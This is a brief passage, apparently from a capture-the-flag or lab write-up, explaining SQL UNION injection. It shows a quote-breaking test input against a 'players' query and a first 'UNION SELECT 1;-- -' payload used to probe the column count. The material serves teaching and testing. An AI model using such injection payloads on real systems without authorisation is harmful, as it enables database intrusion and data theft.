# Union Injection

```bash
username=test&country=Brazil'
```

```
SELECT username from players where country = '[input]';
```

A UNION injection is when I add a UNION statement to the query allowing me to make a new query and append the results to the intended query. I’ll need to match the same number of columns, or the query will error. I’ll start with `Brazil' UNION SELECT 1;-- -`. That would make the query:

```
SELECT username from players where country = 'Brazil' UNION SELECT 1;-- -';
```
